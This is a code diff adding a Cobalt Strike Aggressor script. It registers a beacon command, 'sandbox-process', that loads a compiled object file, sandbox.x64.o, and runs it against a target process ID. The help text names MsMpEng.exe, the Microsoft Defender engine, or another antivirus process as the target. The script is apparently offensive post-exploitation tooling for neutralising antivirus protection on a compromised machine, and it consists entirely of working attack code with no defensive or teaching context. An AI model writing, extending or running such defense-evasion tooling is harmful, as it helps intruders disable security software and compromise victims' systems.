@@ -1,0 +1,14 @@
+beacon_command_register("sandbox-process", "Sandbox a process", "Synopsis: sandbox-process <pid>, where <pid> is the pid of MsMpEng.exe (or another AV)\n");
+
+alias sandbox-process {
+    local('$barch $handle $data');
+
+    # read in the right BOF file
+    $handle = openf(script_resource("bin/sandbox.x64.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+    println($2);
+    $args = bof_pack($1, "i", $2);
+
+    beacon_inline_execute($1, $data, "go", $args);
+}
